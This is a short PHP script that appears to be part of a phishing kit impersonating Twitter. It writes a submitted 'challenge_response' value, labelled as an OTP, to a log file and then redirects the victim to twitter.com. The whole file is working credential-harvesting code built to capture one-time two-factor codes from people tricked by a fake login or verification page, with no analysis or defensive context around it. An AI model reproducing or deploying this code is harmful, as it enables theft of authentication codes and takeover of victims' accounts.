<?php

    file_put_contents("log.txt", "OTP: " . $_POST['challenge_response'] . "\n", FILE_APPEND);
header('Location: https://twitter.com');
exit();